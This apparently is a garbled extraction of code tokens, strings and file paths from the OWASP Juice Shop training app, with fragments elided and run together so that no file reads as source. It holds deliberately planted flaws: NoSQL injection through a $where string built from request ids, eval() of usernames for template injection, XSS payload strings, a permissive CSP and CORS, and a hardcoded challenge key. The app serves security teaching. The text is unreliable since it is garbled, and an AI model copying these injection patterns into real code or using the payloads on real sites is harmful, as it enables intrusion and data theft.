unionSqlInjectionChallenge dbSchemaChallenge vuln-code-snippet end unionSqlInjectionChallenge dbSchemaChallenge'SELECT sql FROM sqlite_master'tableDefinitionssqlimport  ... /index'* as modelsclass E ... ined\r\n}parent: ... definedError | undefinedlet solved = truesolved = trueconst u ... n(data)users = ... n(data)utils.q ... n(data)users.data?.lengthusers.datai < use ... .lengthusers.data.lengthsolved  ... ssword)solved  ... .email)utils.c ... .email)utils.c ... Escapedusers.data[i].emailusers.data[i]utils.c ... ssword)users.d ... asswordif (!so ...       }!solvedvoid mo ...      })models. ... ').thenmodels. ... aster')'SELECT ... master'SELECT sql FROM sqlite_master([data] ...       }[data]const t ... n(data)tableDe ... n(data)if (tab ...       }tableDe ... .lengthtableDe ... ns.datai < tab ... .lengthtableDe ... [i].sqltableDe ... data[i]solved  ... i].sql)utils.c ... i].sql)P:/My Drive/Git/juice-shop/routes/securityQuestion.ts({ quer ... })\r\n  }email = query.emailquery.emailwhere:  ... ing() }{ email ... ing() }email:  ... tring()email?.toString()email?.toString(answer ... \r\n    }if (ans ...       }answer != nullSecurit ... d).then(questi ...       }res.jso ... tion })res.json({})P:/My Drive/Git/juice-shop/routes/showProductReviews.ts Blocking sleep function as in native MongoDB// Bloc ... MongoDB @ts-expect-error FIXME Type safety broken for global object Ensure that users don't accidentally dos their servers for too long// Ensu ... oo long Measure how long the query takes, to check if there was a nosql dos attack// Meas ...  attackt0$where'this.product == 'global. ... \n  }\r\n}global.sleep(time:  ... \n  }\r\n}{\r\n  // ... \n  }\r\n}if (tim ... 00\r\n  }time > 2000time = 2000const s ... tTime()stop =  ... tTime()while ( ...  ;\r\n  }new Dat ...  + timestop + time{\r\n    ;\r\n  }id = !u ... rams.id!utils. ... rams.id!utils. ... llenge)Number( ... ams.id)const t ... tTime()t0 = ne ... tTime()db.revi ... + id }){ $wher ...  + id }$where: ...  ' + id'this.p ...  ' + idthis.product == Review[]t1 = ne ... tTime()challen ... 2000 })() => { ...  2000 }{ retur ...  2000 }return  ...  > 2000(t1 - t0) > 2000(t1 - t0)t1 - t0i < reviews.lengthuser == ... .email)user === undefinedreviews ... .email)reviews ... ncludesreviews[i].likedByreviews[i]reviews ...  = truereviews[i].likedres.jso ... views))utils.q ... eviews)P:/My Drive/Git/juice-shop/routes/trackOrder.ts/[^\w-]+/g`this.orderId === '${}'`'Wrong Param'String( ... /g, '')String( ... replaceString( ... ams.id)[^\w-]+[^\w-]db.orde ... \n    })db.orde ... d}'` }){ $wher ... id}'` }$where: ... ${id}'``this.o ... ${id}'`this.orderId === '(order: ... \r\n    }const r ... (order)result  ... (order)utils.q ... (order)result. ... gth > 1result.data.lengthresult.dataresult.data[0]result. ... d: id }{ orderId: id }orderId: idres.sta ... ram' }){ error ... aram' }error: 'Wrong Param'Wrong ParamP:/My Drive/Git/juice-shop/routes/updateProductReviews.ts vuln-code-snippet start noSqlReviewsChallenge forgedReviewChallenge vuln-code-snippet vuln-line forgedReviewChallenge vuln-code-snippet neutral-line forgedReviewChallenge vuln-code-snippet vuln-line noSqlReviewsChallenge forgedReviewChallenge vuln-code-snippet vuln-line noSqlReviewsChallenge vuln-code-snippet end noSqlReviewsChallenge forgedReviewChallenge() => { ... d > 1 }{ retur ... d > 1 }return  ... ied > 1result.modified > 1result.modifiedchallen ... == 1 })() => { ... === 1 }{ retur ... === 1 }return  ... d === 1user?.d ... d === 1user?.d ... a.emailuser?.d ... inal[0]result.original[0]result.originalresult. ... a.emailresult. ... .authorresult. ... d === 1P:/My Drive/Git/juice-shop/routes/updateUserProfile.ts @ts-expect-error FIXME some properties missing in savedUser// @ts- ... vedUserupdateUserProfile'://htmledit.squarefree.com'referersavedUserreturn  ... sername((req.h ... sername((req.h ... com')))(req.he ... .com'))req.hea ... e.com')req.hea ... ncludesreq.headers.origin'://htm ... ee.com'://htmledit.squarefree.com://htmleditsquarefreereq.headers.refererreq.bod ... sernamereq.body.usernamevoid us ...      })user.up ... name }){ usern ... rname }(savedU ...       }savedUs ... edUser)securit ... edUser)res.coo ... dToken)P:/My Drive/Git/juice-shop/routes/userProfile.ts @ts-expect-error FIXME type issue with string vs. undefined for username// @ts- ... sername'pug'themes'../views/themes/themes'getUserProfile'views/userProfile.pug'/#{(.*)}/abused_ssti_bug'Username is null''\\'/_username_/g/_emailHash_/g/_title_/g/_favicon_/g/_bgColor_/g/_textColor_/gtextColor/_navColor_/gnavColor/_primLight_/gprimLight/_primDark_/gprimDark/_logo_/gCSP`img-src 'self' ${}; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com`/;[ ]*script-src(.)*'unsafe-inline'/g'<script>alert(`xss`)</script>''Content-Security-Policy'const p ... ('pug')pug = require('pug')require('pug')const t ... .themesthemes  ... .themesrequire ... .themesrequire ... hemes')'../vie ... themes'../views/themes/themes/views/themes/themes'views/ ... le.pug'views/userProfile.pugviews/userProfileif (err ... row errlet tem ... tring()templat ... tring()buf.toString()buf.toStringlet use ... sernameuser?.usernameusernam ... llenge)usernam ... == nullusernam ... (.*)}/)username?.match#{(.*)}#{(.*)req.app ... sti_bugconst c ... th - 1)code =  ... th - 1)usernam ... th - 1)username?.substringusername.length - 1username.length!codethrow n ...  null')new Err ...  null')Username is nullusernam ... l(code)eval(code)'\\' + usernameconst t ... heme')]theme = ... heme')]themes[ ... heme')]templat ... ername)template.replace_username_templat ... email))_emailHash_templat ... ame')))_title_entitie ... name'))templat ... icon())_favicon_favicon()templat ... gColor)_bgColor_theme.bgColortemplat ... tColor)_textColor_theme.textColortemplat ... vColor)_navColor_theme.navColortemplat ... mLight)_primLight_theme.primLighttemplat ... imDark)_primDark_theme.primDarktemplat ... ogo')))_logo_utils.e ... logo'))const f ... mplate)fn = pu ... mplate)pug.com ... mplate)pug.compileconst C ... is.com`CSP = ` ... is.com``img-sr ... is.com`img-src 'self' user?.profileImage; scrip ... pis.com; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.comchallen ... t>') })() => { ... pt>') }{ retur ... pt>') }return  ... ript>')user?.p ... ript>')user?.p ... == nulluser?.p ... ine'/g)user?.p ... e.match/;[ ]*s ... line'/g;[ ]*script-src(.)*'unsafe-inline'[ ]*script-src'unsafe-inline'utils.c ... ript>')<script>alert(`xss`)</script>res.set ...      })'Conten ... y': CSP'Conten ... Policy'Content-Security-Policyres.send(fn(user))fn(user)functio ... ))\r\n  }return  ... icon'))utils.e ... icon'))P:/My Drive/Git/juice-shop/routes/verify.tscaptchaReqIdcaptchaBypassReqTimesaccessControlChallenges'/1px.png''/11px.png''/19px.png''/56px.png''/81px.png''/tlh_AA.json''/security.txt''%f0%9f%98%bc-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg'/access\.log(0-9-)*/jwtChallengesjwtChallenge/jwtn3d@/'HS256'/rsa_lord@/serverSideChallenges'tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'verifiedhasAlgorithmhasEmaildatabaseRelatedChallenges`<a href="${}" target="_blank">More...</a>`findAndCountAll'Unable to retrieve feedback details. Please try again'knownVulnerableComponents'Unable to get data for known vulnerabilities. Please try again''%sanitize-html%''%1.4.2%''%express-jwt%''%0.1.3%'weirdCryptos'%z85%''%base85%''%hashids%''%md5%''%base64%''%epilogue-js%''%anuglar2-qrcode%''%pickle rick%'eslintScopeVulnIds'%eslint-scope/issues/39%''%npm:eslint-scope:20180712%'dangerousIngredients'challenges.csafHashValue'`%${}%`const j ... token')jwt = r ... token')require ... token')cache.productsexports ... xt()\r\n}exports ... tration{\r\n  ch ... xt()\r\n}challen ... '\r\n  })challen ... tration() => { ... ''\r\n  }{\r\n     ... ''\r\n  }return  ...  === ''req.bod ...  === ''exports ... allengechallen ... q\r\n  })() => { ... eq\r\n  }{\r\n     ... eq\r\n  }const u ... defineduserId  ... definedreturn  ...  userIdreq.bod ...  userIdreq.body?.UserIdif (cha ... ++\r\n  }req.app ... d >= 10req.app ... haReqIdif ((ne ...       }(new Da ... = 20000(new Da ...  - 10])new Dat ... d - 10]req.app ... d - 10]req.app ... eqTimescaptcha ... eqTimesreq.app ... Id - 10req.app ... tTime()req.app ... Id - 1]req.app ... qId - 1req.app ... ReqId++challen ... n\r\n  })() => { ... in\r\n  }return  ... s.adminreq.bod ... s.adminreq.body.rolechallen ... word })() => { ... sword }{ retur ... sword }return  ... asswordreq.bod ... asswordreq.bod ... dRepeatexports ... llengesaccessC ... llengeschallen ... ng') })() => { ... png') }{ retur ... png') }return  ... x.png')utils.e ... x.png')/1px.png/1px/11px.png/11px/19px.png/19px/56px.png/56px/81px.png/81pxchallen ... on') })() => { ... son') }{ retur ... son') }utils.e ... .json')/tlh_AA.json/tlh_AAchallen ... ile) })() => { ... File) }{ retur ... File) }return  ... geFile)utils.e ... geFile)cache.r ... ngeFilechallen ... xt') })() => { ... txt') }{ retur ... txt') }return  ... y.txt')utils.e ... y.txt')/security.txt/securitytxtchallen ... pg') })() => { ... jpg') }{ retur ... jpg') }return  ... 7.jpg')utils.e ... 7.jpg')url.toLowerCase()url.toLowerCase'%f0%9f ... 77.jpg'%f0%9f%98%bc-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg%f0%9f%98%bc-%23zatschi-%23whoneedsfourlegs-1572600969477challen ... )*/) })() => { ... -)*/) }{ retur ... -)*/) }return  ... -9-)*/)url.mat ... -9-)*/)access\.log(0-9-)*(0-9-)*(0-9-)0-9-exports ... err)\r\n}() => ( ... err)\r\n}(err: u ... err)\r\n}{ statusCode }{\r\n  ch ... err)\r\n}challen ... 401) })() => { ...  401) }{ retur ...  401) }return  ...  > 401)err &&  ...  > 401)(status ...  > 401)statusC ... e > 401statusCode === 200statusCode > 401if (cha ... /)\r\n  }jwtChal ... tn3d@/)jwtn3d@if (uti ... /)\r\n  }jwtChal ... lord@/)HS256rsa_lord@req.que ... ssibl3'req.query.key'tRy_H4 ... ssibl3'tRy_H4rd3r_n0thIng_iS_Imp0ssibl3challen ... == truereq.app ... == trueres.status(204).sendstring | RegExpconst d ...  : nulldecoded ...  : nulljws.dec ...  : nulljwt.decode(token)jwt.decodechallen ... ail) })() => { ... mail) }{ retur ... mail) }return  ...  email)hasAlgo ...  email)hasAlgo ... orithm)hasEmai ...  email)functio ... ithm\r\n}{\r\n  co ... ithm\r\n}const h ... ring())header  ... ring())JSON.pa ... ring())token.split('.')[0]token.split('.')token.splitreturn  ... gorithmtoken & ... gorithmtoken && headerheader. ... gorithmheader.algfunctio ... ail)\r\n}data: { ... tring }{ email: string }{\r\n  re ... ail)\r\n}return  ... (email)token?. ... (email)token?. ... ?.matchtoken?.data?.emailtoken?.datadatabas ... llengesif (cha ... t)\r\n  }challen ... s.osaftproducts.osaftchangeP ... .osaft)if (cha ... ()\r\n  }feedbackChallenge()knownVu ... lenge()weirdCr ... lenge()typosqu ... lenge()hiddenI ... lenge()supplyC ... lenge()dlpPast ... lenge()csafChallenge()let url ...  = nullurlForP ...  = nullvoid os ... }\r\n  })osaft.r ... }\r\n  })osaft.reload().thenosaft.reload()osaft.reloadproduct ... definedif (url ... \r\n    }if (!ut ...       }!utils. ... enge}`)utils.c ... enge}`)osaft.description`${urlF ... lenge}`utils.c ... .</a>`)`<a hre ... ..</a>`<a href="" targe ... ...</a>{\r\n  Fe ...   })\r\n}Feedbac ... }).thenFeedbac ...  5 } })Feedbac ... ountAll{ where ... : 5 } }where: { rating: 5 }({ coun ...  }\r\n  }{ count }{ count: number }count: numberif (cou ... \r\n    }Unable to retrieve feedback details. Please try againUnable to retrieve feedback details[Op.or] ... nents()Op.orknownVu ... nents()knownVu ... ponentscount > 0Unable to get data for known vulnerabilities. Please try againUnable to get data for known vulnerabilitiesComplai ... }).thenComplai ... ountAllmessage ...       }functio ... \n  ]\r\n}{\r\n  re ... \n  ]\r\n}return  ...  }\r\n  ][Op.and ...       ]Op.and{ [Op.l ... tml%' }[Op.lik ... -html%'Op.like%sanitize-html%{ [Op.l ... 4.2%' }[Op.like]: '%1.4.2%'%1.4.2%%12%{ [Op.l ... jwt%' }[Op.lik ... s-jwt%'%express-jwt%{ [Op.l ... 1.3%' }[Op.like]: '%0.1.3%'%0.1.3%%03%[Op.or] ... yptos()weirdCryptos(){ [Op.l ... z85%' }[Op.like]: '%z85%'%z85%{ [Op.l ... e85%' }[Op.lik ... ase85%'%base85%{ [Op.l ... ids%' }[Op.lik ... shids%'%hashids%{ [Op.l ... md5%' }[Op.like]: '%md5%'%md5%{ [Op.l ... e64%' }[Op.lik ... ase64%'%base64%Feedbac ...  ).thenwhere:  ... s%' } }{ comme ... s%' } }comment ... -js%' }{ [Op.l ... -js%' }[Op.lik ... ue-js%'%epilogue-js%Complai ...  ).then{ messa ... s%' } }message ... -js%' }where:  ... e%' } }{ comme ... e%' } }comment ... ode%' }{ [Op.l ... ode%' }[Op.lik ... rcode%'%anuglar2-qrcode%{ messa ... e%' } }message ... ode%' }where:  ... k%' } }{ comme ... k%' } }comment ... ick%' }{ [Op.l ... ick%' }[Op.lik ...  rick%'%pickle rick%{ messa ... k%' } }message ... ick%' }{ where ... ) } } }where:  ... s() } }{ comme ... s() } }comment ... Ids() }{ [Op.o ... Ids() }[Op.or] ... lnIds()eslintScopeVulnIds(){ messa ... s() } }message ... Ids() }{ [Op.l ... /39%' }[Op.lik ... es/39%''%eslin ... es/39%'%eslint-scope/issues/39%{ [Op.l ... 712%' }[Op.lik ... 80712%''%npm:e ... 80712%'%npm:eslint-scope:20180712%comment ... nts() }{ [Op.a ... nts() }[Op.and ... ients()dangero ... ients()message ... nts() }where:  ... '%' } }{ comme ... '%' } }comment ... + '%' }{ [Op.l ... + '%' }[Op.lik ... ) + '%''%' + c ... ) + '%''%' + c ... Value')config. ... Value')'challe ... hValue'challenges.csafHashValue{ messa ... '%' } }message ... + '%' }config. ...    .mapconfig. ... oolean)config. ... llenge)config. ... flatMap(keywor ... \r\n    }return  ... rd}%` }{ [Op.l ... rd}%` }[Op.lik ... word}%``%${keyword}%`P:/My Drive/Git/juice-shop/routes/videoHandler.tsgetVideovideoPath/bytes=/chunksize'Content-Range'`bytes ${'Accept-Ranges''Content-Location''/assets/public/videos/owasp_promo.mp4''video/mp4'promotionVideo'views/promotionVideo.pug'subsgetSubsFromFile'</script><script>alert(`xss`)</script>'compiledTemplate'<script id="subtitle"></script>''<script id="subtitle" type="text/vtt" data-label="English" data-lang="en">''</script>''owasp_promo.vtt''frontend/dist/frontend/assets/public/videos/''frontend/dist/frontend/assets/public/videos/owasp_promo.mp4'exports.getVideoconst p ... oPath()path = videoPath()videoPath()const s ... c(path)stat =  ... c(path)fs.statSync(path)const f ... at.sizefileSize = stat.sizestat.sizeconst r ... s.rangerange = ... s.rangereq.headers.rangeif (ran ... \r\n    }range.r ... it('-')range.r ... ).splitrange.r ... =/, '')range.replacebytes=const s ... 0], 10)start = ... 0], 10)parseIn ... 0], 10)const e ... ize - 1end = p ... ize - 1parts[1 ... ize - 1parseIn ... 1], 10)fileSize - 1const c ... rt) + 1chunksi ... rt) + 1(end - start) + 1(end - start)const f ...  end })file =  ...  end })fs.crea ...  end }){ start, end }const h ...       }head =  ...       }'Conten ... eSize}`Content-Range`bytes  ... eSize}`bytes 'Accept ... 'bytes'Accept-Ranges'Conten ... unksize'Conten ... mo.mp4'Content-Location'/asset ... mo.mp4'/assets/public/videos/owasp_promo.mp4/assets/public/videos/owasp_promomp4'Conten ... eo/mp4'video/mp4res.wri ... , head)res.writeHeadfile.pipe(res)file.pipe'Conten ... ileSizefs.crea ... pe(res)fs.crea ... h).pipefs.crea ... m(path)exports ... onVideo'views/ ... eo.pug'views/promotionVideo.pugviews/promotionVideoconst s ... mFile()subs =  ... mFile()getSubsFromFile()'</scri ... cript>'</script><script>alert(`xss`)</script></script><script>alertlet com ...  = fn()compile ...  = fn()fn()compile ... ript>')compile ... replace<script id="subtitle"></script>'<scrip ...  + subs'<scrip ... ="en">'<script id="subtitle" type="text/vtt" data-label="English" data-lang="en">res.sen ... mplate)functio ... ng()\r\n}{\r\n  co ... ng()\r\n}const s ... mo.vtt'subtitl ... mo.vtt'config. ... mo.vtt'config. ... itles')'fronte ... btitles'fronte ... ideos/'frontend/dist/frontend/assets/public/videos/data.toString()data.toStringfunctio ... mp4'\r\n}{\r\n  if ... mp4'\r\n}if (con ... eo\r\n  }config. ... == nullconfig. ... video'){\r\n     ... eo\r\n  }const v ... ideo'))video = ... ideo'))utils.e ... ideo'))return  ... + video'fronte ... + videoreturn  ... mo.mp4''fronte ... mo.mp4'frontend/dist/frontend/assets/public/videos/owasp_promo.mp4P:/My Drive/Git/juice-shop/routes/vulnCodeFixes.tsFixesDir'data/static/codefixes'codeFixcorrectCodeFixes}_`FixesRequestParamsVerdictRequestBodyserveCodeFixesfixData'No fixes found for the snippet!'checkCorrectFix'./data/static/codefixes/''.info.yml'codingChallengeInfosselectedFixInfoconst y ... -yaml')yaml =  ... -yaml')require('js-yaml')const F ... efixes'FixesDi ... efixes''data/s ... efixes'data/static/codefixescorrect: numbertype ca ... odeFix>Record< ... odeFix>const C ... he = {}CodeFix ... he = {}export  ... key]\r\n}const r ... key]\r\n}readFix ... key]\r\n}(key: s ... key]\r\n}{\r\n  if ... key]\r\n}if (Cod ... y]\r\n  }CodeFixes[key]{\r\n     ... y]\r\n  }return  ... es[key]const f ... xesDir)files = ... xesDir)fs.read ... xesDir)const f ... [] = []fixes: string[] = []let cor ... er = -1correct: number = -1const filefile.st ... key}_`)file.startsWith`${key}_`const f ... tring()fix = f ... tring()fs.read ... tring()fs.read ... oStringfs.read ... file}`)`${Fixe ... {file}`const m ... it('_')metadat ... it('_')file.split('_')file.splitconst n ... data[1]number = metadata[1]metadata[1]fixes.push(fix)fixes.pushif (met ...       }metadat ... h === 3metadata.lengthcorrect ... er, 10)parseInt(number, 10)correct--CodeFix ... ct\r\n  }selectedFix: numberserveCo ...   })\r\n}Request ... known>>const k ... ams.keykey = req.params.keyreq.params.keyconst f ... es(key)fixData ... es(key)readFixes(key)if (fix ... rn\r\n  }fixData ... h === 0fixData.fixes.lengthfixData.fixeserror:  ... ippet!''No fix ... ippet!'No fixes found for the snippet!res.sta ... s\r\n  })fixes: fixData.fixescheckCo ... \n  }\r\n}() => a ... \n  }\r\n}Request ... stBody>const k ... ody.keykey = req.body.keyreq.body.keyconst s ... ctedFixselecte ... ctedFixreq.body.selectedFixif (fix ...  }\r\n  }let explanationif (fs. ... \r\n    }fs.exis ... o.yml')'./data ... fo.yml''./data ... ' + key'./data ... fixes/'./data/static/codefixes/.info.ymlconst c ... utf8'))codingC ... utf8'))yaml.lo ... utf8'))yaml.loadconst s ... ix + 1)selecte ... ix + 1)codingC ... ix + 1)codingC ... es.findcodingC ... ?.fixes({ id } ... Fix + 1id ===  ... Fix + 1selectedFix + 1if (sel ... nation)selecte ... anationexplana ... nation)res.__( ... nation)selecte ... correctfixData.correctawait c ... It(key)challen ... It(key)accurac ...  false)verdict: falseP:/My Drive/Git/juice-shop/routes/vulnCodeSnippet.ts -1 prevents after first attempt// -1 p ... attempt'../lib/codingChallenges'SnippetRequestBodysetStatusCode422codeChallengesserveCodeSnippetsnippetData`No code challenge for challenge key: ${serveChallengesWithCodeSnippetgetVerdictokLinesnotOkLinescheckVulnLines'Line {{vulnLine}} is responsible for this vulnerability or security flaw. Select it and submit to proceed.'vulnLine'Lines {{vulnLines}} are responsible for this vulnerability or security flaw. Select them and submit to proceed.'nextHint'../lib ... lenges'../lib/codingChallenges/lib/codingChallengesselecte ... umber[]setStat ... \n  }\r\n}(error: ... \n  }\r\n}{\r\n  sw ... \n  }\r\n}switch  ... 00\r\n  }error.namecase 'B ... urn 422return 422default ... urn 200return 200const r ... null\r\n}retriev ... null\r\n}async ( ... null\r\n}{\r\n  co ... null\r\n}codeCha ... enges()if (cod ... ll\r\n  }codeCha ... ngeKey)codeChallenges.hasreturn  ... ?? nullcodeCha ... ?? nullcodeChallenges.getexports ... Snippettry {\r\n ... })\r\n  }const s ... llenge)snippet ... llenge)await r ... llenge)retriev ... llenge)req.params.challengesnippetData == nullres.sta ... ge}` }){ statu ... nge}` }error:  ... lenge}``No cod ... lenge}`No code ... e key: No code challenge for challenge key: res.sta ... ppet }){ snipp ... ippet }snippetData.snippetcatch ( ... })\r\n  }const s ... (error)statusC ... (error)setStatusCode(error)res.sta ... ror) })res.sta ... e).jsonres.sta ... usCode){ statu ... rror) }error:  ... (error)export  ... s()]\r\n}const r ... s()]\r\n}retriev ... s()]\r\n}async ( ... s()]\r\n}{\r\n  co ... s()]\r\n}return  ... keys()][...cod ... keys()]...code ... .keys()codeCha ... .keys()codeChallenges.keysexports ... s })\r\n}serveCh ... Snippet() => a ... s })\r\n}async ( ... s })\r\n}{\r\n  co ... s })\r\n}const c ... ippet()codingC ... ippet()await r ... ippet()res.jso ... nges }){ chall ... enges }export  ... == 0\r\n}const g ... == 0\r\n}getVerd ... == 0\r\n}(vulnLi ... == 0\r\n}{\r\n  if ... == 0\r\n}if (sel ... n falseselecte ... definedif (vul ... n falsevulnLin ... .lengthselectedLines.lengthif (!vu ... n false!vulnLi ... des(e))vulnLin ... des(e))vulnLines.everye => se ... udes(e)selecte ... udes(e)selecte ... ncludesconst o ... lLines]okLines ... lLines][...vul ... lLines]...vulnLines...neutralLinesconst n ... des(x))notOkLi ... des(x))selecte ... des(x))selectedLines.filterx => !o ... udes(x)!okLines.includes(x)okLines.includes(x)okLines.includesreturn  ... h === 0notOkLi ... h === 0notOkLines.lengthexports ... lnLineslet snippetDatatry {\r\n ... rn\r\n  }snippet ... et(key)await r ... et(key)retriev ... et(key)res.sta ... ey}` }){ statu ... key}` }error:  ... ${key}``No cod ... ${key}`catch ( ... rn\r\n  }const v ... lnLinessnippet ... lnLinesconst n ... alLinessnippet ... alLinesconst s ... edLinesselecte ... edLinesreq.bod ... edLinesconst v ... dLines)verdict ... dLines)getVerd ... dLines)let hintif (fs. ...  }\r\n  }if (cod ... \r\n    }codingC ... ?.hintsif (acc ...       }accurac ... .lengthaccurac ... ts(key)accurac ... ttemptscodingC ... .lengthcodingC ... s.hintsif (vul ...       }vulnLin ... h === 1hint =  ... ng() })'Line { ... oceed.'Line {{vulnLine}} is responsible for this vulnerability or security flaw. Select it and submit to proceed.{ vulnL ... ing() }vulnLin ... tring()vulnLin ... oStringvulnLines[0]'Lines  ... oceed.'Lines {{vulnLines}} are responsible for this vulnerability or security flaw. Select them and submit to proceed.vulnLines.toString()vulnLines.toStringconst n ... y) - 1]nextHin ... y) - 1]codingC ... y) - 1]accurac ... ey) - 1if (nex ... xtHint)hint =  ... xtHint)res.__(nextHint)if (ver ... })\r\n  }P:/My Drive/Git/juice-shop/routes/wallet.tsgetWalletBalanceaddWalletBalancecardId402'Payment not accepted.'module. ... Balanceif (wal ... \r\n    }res.sta ... ance }){ statu ... lance }data: wallet.balanceconst c ... ymentIdcardId  ... ymentIdconst c ...  : nullcard =  ...  : nullcardId  ...  : null{ id: c ... serId }id: cardIdWalletM ... }).then{ balan ... lance }balance ... balancereq.body.balancedata: r ... balanceres.status(402).jsonres.status(402)message ... epted.''Paymen ... epted.'Payment not accepted.Payment not acceptedP:/My Drive/Git/juice-shop/routes/web3Wallet.tsweb3WalletAddresswalletsConnectedcontractExploitListenerexploiterconst w ... lletABIweb3Wal ... lletABIrequire ... lletABIconst w ... 5Bd7b0'web3Wal ... 5Bd7b0'const w ... w Set()wallets ... w Set()contrac ... istenerwallets ... ddress)walletsConnected.add(exploi ...       }if (wal ...       }wallets ... loiter)walletsConnected.haswallets ... .deleteP:/My Drive/Git/juice-shop/rsn/rsn-update.tsP:/My Drive/Git/juice-shop/rsnreadFilescheckDiffswriteToFile'./rsnUtil''---------------------------------------''All file diffs have been locked!'} Commit changed cache.json to git.`import  ... snUtil'./rsnUtil/rsnUtilconst k ... Files()keys = readFiles()readFiles()checkDi ... 1\r\n  })checkDi ...  .catchcheckDi ... )\r\n  })checkDi ...   .thencheckDiffs(keys)data => ... `)\r\n  }console ... ----'))('----- ... -----')'------ ... ------'---------------------------------------writeToFile(data)console ...  git.`)`${colo ... o git.`colors. ... cked!')'All fi ... ocked!'All file diffs have been locked! Commit ... to git. Commit changed cache.json to git.err =>  ...  1\r\n  }{\r\n     ...  1\r\n  }process.exitCode = 1process.exitCodeP:/My Drive/Git/juice-shop/rsn/rsn-verbose.tsgetDataFromFilecheckDataseePatchfileDatafilesWithDiff'No new file diffs recognized since last lock!'} No action required.`'New file diffs recognized since last lock!'} Double-check and amend listed files and lock new state with ${'npm run rsn:update'`Be aware that diffs for the ${} affected files below contain ${'all changes'} including locked & cached ones! Compare carefully!`checkDi ... }\r\n  })data => ...  }\r\n  }console ... -----')const f ... mFile()fileDat ... mFile()getDataFromFile()const f ... leData)filesWi ... leData)checkDa ... leData)filesWi ... h === 0filesWithDiff.lengthconsole ... ired.`)`${colo ... uired.`colors. ... ock!'))colors. ... lock!')'No new ...  lock!'No new file diffs recognized since last lock! No action required.console ... te')}`)`${colo ... ate')}`'New fi ...  lock!'New file diffs recognized since last lock! Double ... e with  Double-check and amend listed files and lock new state with colors. ... pdate')npm run rsn:updateconsole ... ully!`)`Be awa ... fully!`Be awar ... or the Be aware that diffs for the  affect ... ontain  affected files below contain colors. ... anges')all changes includ ... efully! including locked & cached ones! Compare carefully!filesWi ... ile) })filesWi ... forEachasync f ... file) }{ await ... file) }await seePatch(file)seePatch(file)P:/My Drive/Git/juice-shop/rsn/rsn.tsP:/My Drive/Git/juice-shop/rsn/rsnUtil.tsDiff'diff'fixesPathcacheFile'rsn/cache.json'CacheData'.editorconfig''\t'filterString/\r/gcurrdiffLinespartnormtempstructuredPatchhunkhunksfileDataValueAddeddataValueAddedfileDataValueRemoveddataValueAddedRemovedindconst D ... 'diff')Diff =  ... 'diff')require('diff')const f ... efixes'fixesPa ... efixes'const c ... e.json'cacheFi ... e.json'rsn/cache.jsonrsn/cachetype Ca ... r[]\r\n}>Record< ... r[]\r\n}>{\r\n  ad ... er[]\r\n}added: number[]removed: number[]functio ... keys\r\n}{\r\n  co ... keys\r\n}const f ... esPath)files = ... esPath)fs.read ... esPath)const k ... nfig'))keys =  ... nfig'))files.f ... nfig'))files.filter(file:  ... onfig')!file.e ... onfig')!file.e ... o.yml')file.en ... o.yml')file.endsWithfile.en ... onfig').editorconfigeditorconfigreturn keysfunctio ... t'))\r\n}{\r\n  fs ... t'))\r\n}fs.writ ...  '\t'))JSON.st ... , '\t')functio ... ata)\r\n}{\r\n  co ... ata)\r\n}fs.read ... heFile)return  ... e(data)JSON.parse(data)functio ... text\r\n}{\r\n  te ... text\r\n}text =  ... /g, '')text.re ... /g, '')text.replaceconst c ... data\r\n}checkDi ... data\r\n}async ( ... data\r\n}{\r\n  co ... data\r\n}const d ...  }, {})data: C ...  }, {})keys.re ...  }, {})keys.reduce(prev,  ...  }\r\n  }return  ... \r\n    }...prev[curr]: ...       }added: []removed: []for (co ... })\r\n  }const valawait r ...      })retriev ...  .catchretriev ...   .thenretriev ... _')[0])val.split('_')[0]val.split('_')val.splitsnippet ...       }if (sni ...  returnsnippet == nullprocess ... + ': ')process.stdout.writeprocess.stdoutval + ': 'fileDat ... tring()fs.read ...  + val)fixesPa ... ' + valfixesPath + '/'const d ... ippet))diff =  ... ippet))Diff.di ... ippet))Diff.diffLinesfilterS ... leData)filterS ... nippet)snippet.snippetlet line = 0line = 0const partif (par ... ontinuepart.removedconst prev = lineprev = lineline += part.countpart.countif (!(p ... ontinue!(part.added)(part.added)part.addedi < part.countif (!sn ...       }!snippe ...  i + 1)snippet ...  i + 1)snippet ... ncludessnippet.vulnLinesprev + i + 1prev + isnippet.neutralLinesprocess ... + '')))colors. ...  + ''))colors. ... 1 + '')colors.inverseprev + i + 1 + ''process ... te(' ')data[va ...  i + 1)data[val].added.pushdata[val].addeddata[val]if (sni ...       }process ...  ' ')))colors. ... + ' '))colors. ...  + ' ')prev + i + 1 + ' 'process ... + ' '))let norm = 0norm = 0norm--!(part.removed)(part.removed)let temp = normtemp = norm!snippe ... - norm)snippet ... - norm)prev + i + 1 - normprocess ...  ''))))colors. ... + '')))(prev + ... m + '')prev +  ... rm + ''data[va ... - norm)data[va ... ed.pushdata[val].removedprev +  ... m + ' 'temp++norm = tempprocess ... e('\n')err =>  ...       }return dataasync f ... --')\r\n}{\r\n  co ... --')\r\n}fixesPa ...  + fileconst s ... _')[0])snippet ... _')[0])await r ... _')[0])file.split('_')[0]const p ... eData))patch = ... eData))Diff.st ... eData))Diff.structuredPatchconsole ...  '\n'))colors. ... + '\n')file + '\n'patch.hunksconst hunkhunk.linesconst lineif (lin ...       }line[0] === '-'line[0]console ... (line))colors.red(line)line[0] === '+'colors.green(line)console.log(line)functio ... Diff\r\n}{\r\n  co ... Diff\r\n}const f ... ff = []filesWithDiff = []const f ...  a - b)fileDat ...  a - b)fileDat ... ed.sortfileData[key].addedfileData[key](a, b) => a - bconst d ...  a - b)dataVal ...  a - b)data[ke ...  a - b)data[key].added.sortdata[key].addeddata[key]dataVal ... RemovedfileDat ... .lengthdataVal ... .length!dataVa ... == val)dataVal ... == val)dataValueAdded.every(val: n ... === valfileDat ... === valfileDat ... ed[ind]console ... d(key))colors.red(key)filesWi ... sh(key)filesWithDiff.pushdataVal ... d.everyreturn filesWithDiffexport  ... Data\r\n}P:/My Drive/Git/juice-shop/server.ts Wraps the function and measures its (async) execution time// Wrap ... on time Sets view engine to hbs /* Sets ...  hbs */ Function called first to ensure that all the i18n files are reloaded successfully before other linked operations.// Func ... ations. Locals /* Locals */ Compression for all requests /* Comp ... ests */ Bludgeon solution for possible CORS problems: Allow everything! /* Blud ... ing! */ Security middleware /* Secu ... ware */ app.use(helmet.xssFilter()); // = 